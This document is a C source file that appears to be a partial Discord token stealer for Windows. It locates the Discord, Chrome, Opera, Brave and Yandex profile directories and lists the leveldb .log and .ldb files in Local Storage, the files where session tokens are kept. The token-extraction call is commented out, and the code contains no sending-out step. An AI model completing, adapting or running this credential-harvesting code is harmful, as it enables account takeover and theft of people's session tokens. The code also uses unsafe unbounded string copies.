#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/stat.h>

// Define color constants using RGB values
#define COLOR_BLACK      "\033[0;30m"
#define COLOR_RED        "\033[0;31m"
#define COLOR_GREEN      "\033[0;32m"
#define COLOR_YELLOW     "\033[0;33m"
#define COLOR_BLUE       "\033[0;34m"
#define COLOR_MAGENTA    "\033[0;35m"
#define COLOR_CYAN       "\033[0;36m"
#define COLOR_WHITE      "\033[0;37m"
#define COLOR_RESET      "\033[0m"

char *find_tokens(char *path);
bool get_ext(const char *file);

int main(void) {
    char* local = getenv("LOCALAPPDATA");
    char* roaming = getenv("APPDATA");

    if (local == NULL || roaming == NULL) {
        printf("Environment variables not found.\n");
        return 1;
    }

    char* paths[8];
    paths[0] = strcat(strcpy(malloc(strlen(roaming) + strlen("\\Discord") + 1), roaming), "\\Discord");
    paths[1] = strcat(strcpy(malloc(strlen(roaming) + strlen("\\discordcanary") + 1), roaming), "\\discordcanary");
    paths[2] = strcat(strcpy(malloc(strlen(roaming) + strlen("\\discordptb") + 1), roaming), "\\discordptb");
    paths[3] = strcat(strcpy(malloc(strlen(local) + strlen("\\Google\\Chrome\\User Data\\Default") + 1), local), "\\Google\\Chrome\\User Data\\Default");
    paths[4] = strcat(strcpy(malloc(strlen(roaming) + strlen("\\Opera Software\\Opera Stable") + 1), roaming), "\\Opera Software\\Opera Stable");
    paths[5] = strcat(strcpy(malloc(strlen(local) + strlen("\\BraveSoftware\\Brave-Browser\\User Data\\Default") + 1), local), "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
    paths[6] = strcat(strcpy(malloc(strlen(local) + strlen("\\Yandex\\YandexBrowser\\User Data\\Default") + 1), local), "\\Yandex\\YandexBrowser\\User Data\\Default");
    paths[7] = NULL;

    for (int i = 0; paths[i] != NULL; i++) {
        struct stat st;
        if (stat(paths[i], &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                printf("Directory %s %sexists.%s\n", paths[i], COLOR_GREEN, COLOR_RESET);
                printf("Token: %s\n", find_tokens(paths[i]));
            } else {
                continue;
                //printf("Path %s exists, but it is not a directory.\n", paths[i]);
            }
        } else {
            continue;
            //printf("Directory %s does not exist or there was an error.\n", paths[i]);
        }
        free(paths[i]);
    }
    return 0;
}

char *find_tokens(char *path) {
    char tokens[16][256]; // Array to store token file paths
    int token_count = 0; // Counter for tokens found

    // Create a buffer for the directory path
    char dir_path[512];
    strcpy(dir_path, path);
    strcat(dir_path, "\\Local Storage\\leveldb");

    printf("Final path: %s\n", dir_path);

    // Open the directory
    DIR *d;
    struct dirent *dir;
    d = opendir(dir_path);

    if (d) {
        while ((dir = readdir(d)) != NULL) {
            char file_path[512]; // Buffer for the full file path
            strcpy(file_path, dir_path); // Copy the directory path

            if (get_ext(dir->d_name)) {
                strcat(file_path, "\\");
                strcat(file_path, dir->d_name);
                printf("Tokens for %s:\n", dir->d_name);
                //printf("%s\n", grab_token(file_path));
                token_count++;
            }
        }
        closedir(d);
    }

    if (token_count == 0) {
        return "No tokens found.";
    } else {
        return "Tokens found.";
    }
}

bool get_ext(const char *file) {
    const char *dot = strrchr(file, '.');
    if (!dot || dot == file) return false;
    if (strcmp(dot, ".log") == 0 || strcmp(dot, ".ldb") == 0) return true;
    return false;
}